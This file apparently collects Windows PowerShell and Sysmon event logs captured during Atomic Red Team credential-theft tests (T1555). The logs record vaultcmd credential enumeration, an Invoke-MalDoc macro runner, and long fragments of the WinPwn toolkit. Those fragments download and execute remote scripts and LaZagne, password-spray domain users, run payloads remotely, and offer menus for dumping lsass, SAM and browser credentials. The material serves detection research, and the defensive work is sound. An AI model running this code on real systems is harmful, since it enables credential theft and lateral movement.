@@ -1,0 +1,2188 @@
+Atomic Test #1 - Extract Windows Credential Manager via VBA
+
+Log1
+10/01/2024 10:31:12 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=2448
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+function Invoke-MalDoc {
+    <#
+    .SYNOPSIS
+    A module to programatically execute Microsoft Word and Excel Documents containing macros.
+
+    .DESCRIPTION
+    A module to programatically execute Microsoft Word and Excel Documents containing macros. The module will temporarily add a registry key to allow PowerShell to interact with VBA.
+    .PARAMETER macroCode
+    [Required] The VBA code to be executed. By default, this macro code will be wrapped in a sub routine, called "Test" by default. If you don't want your macro code to be wrapped in a subroutine use the `-noWrap` flag. To specify the subroutine name use the `-sub` parameter.
+    .PARAMETER macroFile
+    [Required] A file containing the VBA code to be executed. To specify the subroutine name to be called use the `-sub` parameter.
+    .PARAMETER officeVersion
+    [Optional] The Microsoft Office version to use for executing the document. e.g. "16.0". The version will be determined Programmatically if not specified.
+    .PARAMETER officeProduct
+    [Required] The Microsoft Office application in which to create and execute the macro, either "Word" or "Excel".
+    .PARAMETER sub
+    [Optional] The name of the subroutine in the macro code to call for execution. Also the name of the subroutine to wrap the supplied `macroCode` in if `noWrap` is not specified.
+    .PARAMETER noWrap
+    [Optional] A switch that specifies that the supplied `macroCode` should be used as-is and not wrapped in a subroutine.
+    
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroCode "MsgBox `"Hello`"" -officeProduct "Word"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macro code `MsgBox "Hello"` will be wrapped inside of a subroutine call "Test" and then executed.
+    
+    .EXAMPLE
+    C:\PS> $macroCode = Get-Content path/to/macro.txt -Raw
+    C:\PS> Invoke-Maldoc -macroCode $macroCode -officeProduct "Word"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macro code read from `path/to/macro.txt` will be wrapped inside of a subroutine call "Test" and then executed.
+    
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroCode "MsgBox `"Hello`"" -officeProduct "Excel" -sub "DoIt"
+    -----------
+    Create a macro enabled Microsoft Excel Document. The macro code `MsgBox "Hello"` will be wrapped inside of a subroutine call "DoIt" and then executed.
+
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroCode "Sub Exec()`nMsgBox `"Hello`"`nEnd Sub" -officeProduct "Word" -noWrap -sub "Exec"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macroCode will be unmodified (i.e. not wrapped insided a subroutine) and the "Exec" subroutine will be executed.
+
+    .EXAMPLE
+    C:\PS> Invoke-Maldoc -macroFile "C:\AtomicRedTeam\atomics\T1003\src\macro.txt" -officeProduct "Word" -sub "DoIt"
+    -----------
+    Create a macro enabled Microsoft Word Document. The macroCode will be read from the specified file and the "DoIt" subroutine will be executed.
+
+#>
+
+    Param(
+        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "code")]
+        [String]$macroCode,
+
+        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "file")]
+        [String]$macroFile,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]$officeVersion,
+
+        [Parameter(Position = 2, Mandatory = $True)]
+        [ValidateSet("Word", "Excel")]
+        [String]$officeProduct,
+
+        [Parameter(Position = 3, Mandatory = $false)]
+        [String]$sub = "Test",
+
+        [Parameter(Position = 4, Mandatory = $false, ParameterSetName = "code")]
+        [switch]$noWrap
+    )
+
+    $app = New-Object -ComObject "$officeProduct.Application"
+    if (-not $officeVersion) { $officeVersion = $app.Version } 
+    $Key = "HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\"
+    if (-not (Test-Path $key)) { New-Item $Key }
+    Set-ItemProperty -Path $Key -Name 'AccessVBOM' -Value 1
+
+    if ($macroFile) {
+        $macroCode = Get-Content $macroFile -Raw
+    }
+    elseif (-not $noWrap) {
+        $macroCode = "Sub $sub()`n" + $macroCode + "`nEnd Sub"
+    }
+
+    if ($officeProduct -eq "Word") {
+        $doc = $app.Documents.Add()
+    }
+    else {
+        $doc = $app.Workbooks.Add()
+    }
+    $comp = $doc.VBProject.VBComponents.Add(1)
+    $comp.CodeModule.AddFromString($macroCode)
+    $app.Run($sub)
+    $doc.Close(0)
+    $app.Quit()
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comp) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app) | Out-Null
+    [System.GC]::Collect()
+    [System.GC]::WaitForPendingFinalizers()
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\" -Name 'AccessVBOM' -ErrorAction Ignore
+}
+
+ScriptBlock ID: 6ecb12f6-ce0e-4819-9426-3b537124bb3f
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\T1555_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #4 - Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]
+
+Log1
+09/03/2024 05:51:11 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=143851
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-02 21:51:11.364
+ProcessGuid: {6f6dba56-334f-66d6-f05d-2a0000001700}
+ProcessId: 7464
+Image: C:\Windows\System32\VaultCmd.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Vault cmdline Program
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: VAULTCMD.EXE
+CommandLine: "C:\Windows\system32\VaultCmd.exe" "/listcreds:Windows Credentials" /all
+CurrentDirectory: E:\Download\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-cddf-66bd-ef4c-6e0000000000}
+LogonId: 0x6E4CEF
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=95AE738AB6B2CC92D88E3DEBBAACDD924BC27F5E,MD5=5F69F4F8683151A59C5A11265B4A3C96,SHA256=EDC1B6A3E4FDE216A323329E35F4192B0F49BC68285EE67036DEFF9E94C4E33A,IMPHASH=692BBD94F45AD2DFEFD2A3DA11FCCE0F
+ParentProcessGuid: {6f6dba56-2e37-66d6-a454-2a0000001700}
+ParentProcessId: 108044
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+
+Log2
+09/03/2024 05:49:42 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=132794
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-02 21:49:42.710
+ProcessGuid: {6f6dba56-32f6-66d6-395d-2a0000001700}
+ProcessId: 105796
+Image: C:\Windows\System32\VaultCmd.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Vault cmdline Program
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: VAULTCMD.EXE
+CommandLine: "C:\Windows\system32\VaultCmd.exe" "/listcreds:Windows Credentials" /all
+CurrentDirectory: E:\Download\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-cddf-66bd-ef4c-6e0000000000}
+LogonId: 0x6E4CEF
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=95AE738AB6B2CC92D88E3DEBBAACDD924BC27F5E,MD5=5F69F4F8683151A59C5A11265B4A3C96,SHA256=EDC1B6A3E4FDE216A323329E35F4192B0F49BC68285EE67036DEFF9E94C4E33A,IMPHASH=692BBD94F45AD2DFEFD2A3DA11FCCE0F
+ParentProcessGuid: {6f6dba56-2e37-66d6-a454-2a0000001700}
+ParentProcessId: 108044
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+
+Atomic Test #5 - Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]
+
+Log1 
+09/03/2024 05:49:53 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=133326
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-02 21:49:53.338
+ProcessGuid: {6f6dba56-3301-66d6-425d-2a0000001700}
+ProcessId: 104644
+Image: C:\Windows\System32\VaultCmd.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Vault cmdline Program
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: VAULTCMD.EXE
+CommandLine: "C:\Windows\system32\VaultCmd.exe" "/listcreds:Web Credentials" /all
+CurrentDirectory: E:\Download\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-cddf-66bd-ef4c-6e0000000000}
+LogonId: 0x6E4CEF
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=95AE738AB6B2CC92D88E3DEBBAACDD924BC27F5E,MD5=5F69F4F8683151A59C5A11265B4A3C96,SHA256=EDC1B6A3E4FDE216A323329E35F4192B0F49BC68285EE67036DEFF9E94C4E33A,IMPHASH=692BBD94F45AD2DFEFD2A3DA11FCCE0F
+ParentProcessGuid: {6f6dba56-2e37-66d6-a454-2a0000001700}
+ParentProcessId: 108044
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+
+Atomic Test #6 - WinPwn - Loot local Credentials - lazagne
+
+Log1
+10/01/2024 10:33:02 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=2462
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 14，共 16):
+-PrivescCheck'
+            Write-Host -ForegroundColor Green '2. winPEAS! '
+            Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
+            Write-Host -ForegroundColor Green '4. All other checks! '
+            Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{itm4nprivesc}
+                2{winPEAS}
+                3{oldchecks}
+                4{otherchecks}
+            }
+        }
+        While ($masterquestion -ne 5)  
+
+}
+
+function laZagnemodule
+{
+    <#
+        .DESCRIPTION
+        Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Privilege Escalation Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+	{
+		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
+	}
+	else
+	{
+		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/wincreds.exe') -Outfile $currentPath\WinCreds.exe
+	}
+    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
+    if (Test-Path $currentPath\WinCreds.exe)
+    {
+        Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
+      if(!$consoleoutput){mkdir $currentPath\Lazagne}
+        if(!$consoleoutput){.\WinCreds.exe all >> "$currentPath\Lazagne\Passwords.txt"}else{.\WinCreds.exe all}
+        Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
+    }
+    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy:'}
+}
+
+function latmov
+{
+    <#
+        .DESCRIPTION
+        Looks for administrative Access on any system in the current network/domain. If Admin Access is available somewhere, Credentials can be dumped remotely / alternatively Powershell_Empire Stager can be executed.
+        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Lateral Movement Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/view.ps1')
+    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+    
+    
+    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'
+
+    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'
+
+    fuller >> $currentPath\Exploitation\LocalAdminAccess.txt
+
+    $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems? (yes/no)'
+    if ($exploitdecision -eq "yes" -or $exploitdecision -eq "y")
+    {
+        launcher
+    }
+}
+
+function Domainpassspray
+{
+    <#
+        .DESCRIPTION
+        Domain password spray, credit to https://github.com/dafthack/.
+    #>
+    #Lateral Movement Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput,
+    [Switch]
+        $emptypasswords,
+    [Switch]
+        $usernameaspassword,
+        [String]
+        $password   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
+    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+    
+    if ($emptypasswords)
+    {
+      IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1')
+    if(!$consoleoutput){Invoke-SprayEmptyPassword -outfile $currentPath\Exploitation\EmptyPasswords.txt}
+    else
+    {
+      Invoke-SprayEmptyPassword
+    }
+    }
+    elseif($usernameaspassword)
+    {
+        if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name}
+        if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -UsernameAsPassword -Domain $domain.Name -OutFile $currentPath\Exploitation\UsernameAsPasswordCreds.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -UsernameAsPassword}  
+        if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\UsernameAsPasswordCreds.txt"} 
+    }
+    else
+    {    	  	
+      if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}
+        if (Test-Path $currentPath\passlist.txt) 
+        {
+          Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
+        }
+        else 
+        { 
+           if(!$consoleoutput){$onepass = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'}
+           if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -Password $password}  
+           if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt"}
+    }
+   }
+}
+
+function launcher
+{
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/wmicmd.ps1')
+    if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
+    {
+        $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
+    }
+    else
+    {
+        $file = "$currentPath\Exploitation\Exploited.txt"
+        While($i -ne "quit") 
+        {
+          If ($i -ne $NULL) 
+            {
+            $i.Trim() | Out-File $file -append
+          }
+          $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target:'    
+        }
+
+    }
+
+    $stagerfile = "$currentPath\Exploitation\Stager.txt"
+    While($Payload -ne "quit") 
+    {
+      If ($Payload -ne $NULL) 
+        {
+          $Payload.Trim() | Out-File $stagerfile -append
+      }
+        $Payload = Read-Host -Prompt 'Please provide the code to execute :'
+    }
+    
+    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'
+
+    if (Test-Path $currentPath\Exploitation\Exploited.txt)
+    {
+        $Hosts = Get-Content "$currentPath\Exploitation\Exploited.txt"
+    }
+    else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}
+
+    if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
+    {
+        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload
+    }
+    else 
+    {
+        $Credential = Get-Credential
+        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential
+    }
+}
+
+function Shareenumeration
+{
+    <#
+        .DESCRIPTION
+        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Enumeration Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/view.ps1')
+    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
+    if(!$consoleoutput){Claire >> $currentPath\SensitiveFiles.txt}else{Claire}
+    if(!$consoleoutput){shift -qgsNZggitoinaTA >> $currentPath\Networkshares.txt}else{shift -qgsNZggitoinaTA}
+}
+
+function groupsearch
+{
+    <#
+        .DESCRIPTION
+        AD can be searched for specific User/Group Relations over Group Policies.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Enumeration Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    iex ($viewdevobfs)
+    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
+            if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
+            {
+                Write-Host -ForegroundColor Yellow 'Please enter a username to search for:'
+                $username = Get-Credential
+                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
+                Write-Host -ForegroundColor Yellow 'Searching...:'
+                rewires -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
+            }
+            else
+            {
+                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
+                Write-Host -ForegroundColor Yellow 'Searching...:'
+                rewires -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
+                Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\Groupsearches.txt:'
+            }
+}
+
+function proxydetect
+{
+    <#
+        .DESCRIPTION
+        Checks, if a proxy is active. Uses current users credentials for Proxy Access / other user input is possible as well.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>    
+    #Proxy Detect #1
+    
+    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'
+
+    $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
+    $regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
+
+    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))
+    {
+        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is: '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights? (yes/no)'
+        if ($proxy -eq "yes" -or $proxy -eq "y" -or $proxy -eq "Yes" -or $proxy -eq "Y")
+        {
+             #Proxy
+            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
+            $Wcl = new-object System.Net.WebClient
+            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+        }
+        else
+        {
+            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'
+            #Proxy Integration manual user
+            $webclient=New-Object System.Net.WebClient
+            $creds=Get-Credential
+            $webclient.Proxy.Credentials=$creds
+        }
+   }
+    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
+}
+
+function Kerberoasting
+{
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    #Exploitation Phase
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    Write-Host -ForegroundColor Red 'Kerberoasting active:'
+        
+    Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .\Exploitation\'
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+    if(!$consoleoutput){Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt"}else{Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"}
+    if(!$consoleoutput){Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"}else{Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"}
+  Write-Host -ForegroundColor Yellow 'Using the powershell version as backup: '
+}
+
+function inv-phantom {
+    if (isadmin)
+    {
+        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/phantom.ps1')
+        phantom
+    }
+    else 
+    { 
+        Write-Host -ForegroundColor Yellow 'You are not admin, do something else for example Privesc :-P'
+        Sleep 3;
+    }
+}
+
+filter ConvertFrom-SDDL
+{
+  <#
+      .SYNOPSIS
+      Author: Matthew Graeber (@mattifestation)
+      .LINK
+      http://www.exploit-monday.com
+  #>
+
+    Param (
+        [Parameter( Position = 0, Mandatory = $True, ValueFromPipeline = $True )]
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $RawSDDL
+    )
+
+    $RawSDDL = $RawSDDL -replace "`n|`r"
+    Set-StrictMode -Version 2
+
+    # Get reference to sealed RawSecurityDescriptor class
+    $RawSecurityDescriptor = [Int].Assembly.GetTypes() | ? { $_.FullName -eq 'System.Security.AccessControl.RawSecurityDescriptor' }
+
+    # Create an instance of the RawSecurityDescriptor class based upon the provided raw SDDL
+    try
+    {
+        $Sddl = [Activator]::CreateInstance($RawSecurityDescriptor, [Object[]] @($RawSDDL))
+    }
+    catch [Management.Automation.MethodInvocationException]
+    {
+        throw $Error[0]
+    }
+    if ($Sddl.Group -eq $null)
+    {
+        $Group = $null
+    }
+    else
+    {
+        $SID = $Sddl.Group
+        $Group = $SID.Translate([Security.Principal.NTAccount]).Value
+    }
+    if ($Sddl.Owner -eq $null)
+    {
+        $Owner = $null
+    }
+    else
+    {
+        $SID = $Sddl.Owner
+        $Owner = $SID.Translate([Security.Principal.NTAccou
+
+ScriptBlock ID: cfbd832f-4232-4aee-889d-e8ca30b60e75
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\T1555_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/01/2024 10:33:02 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=2451
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 3，共 16):
+mory (Admin session only)! '
+            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
+            Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
+            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
+            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
+            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
+          Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
+          Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
+    Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
+          Write-Host -ForegroundColor Green '12. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
+                2{if (isadmin){obfuskittiedump}}
+                3{if(isadmin){safedump}}
+                4{if(isadmin){dumplsass}}
+                5{lazagnemodule}
+                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
+            7{kittenz}
+            8{if(isadmin){wificreds}}
+            9{if(isadmin){samfile}}
+      10{SharpCloud}
+      11{decryptteamviewer}
+             }
+        }
+        While ($masterquestion -ne 12)
+}
+
+
+function lsassdumps
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Dump lsass for sweet creds
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Use HandleKatz! '
+            Write-Host -ForegroundColor Green '2. Use WerDump! '
+            Write-Host -ForegroundColor Green '3. Dump lsass using rundll32 technique!'
+            Write-Host -ForegroundColor Green '4. Dump lsass using NanoDump!'
+            Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){HandleKatz}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                2{if(isadmin){werDump}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
